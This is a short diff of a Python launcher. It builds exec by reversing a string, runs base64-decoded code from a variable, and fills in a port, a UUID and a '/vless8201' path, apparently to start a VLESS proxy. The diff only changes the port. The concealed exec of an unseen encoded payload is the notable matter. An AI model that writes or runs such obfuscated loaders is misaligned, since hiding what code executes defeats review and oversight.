@@ -3,7 +3,7 @@ from base64 import b64decode as de
 
 if __name__ == "__main__":
     getattr(__builtins__, "cexe"[::-1])(
-        de(key).decode("utf8").replace(str(int("0x1f90", 16)), str(3000))
+        de(key).decode("utf8").replace(str(int("0x1f90", 16)), str(8080))
         .replace("fc_", "True")
         .replace("iu_", "1c559614-082b-431c-859d-1a55b860030d")
         .replace("lv_", "/vless8201")
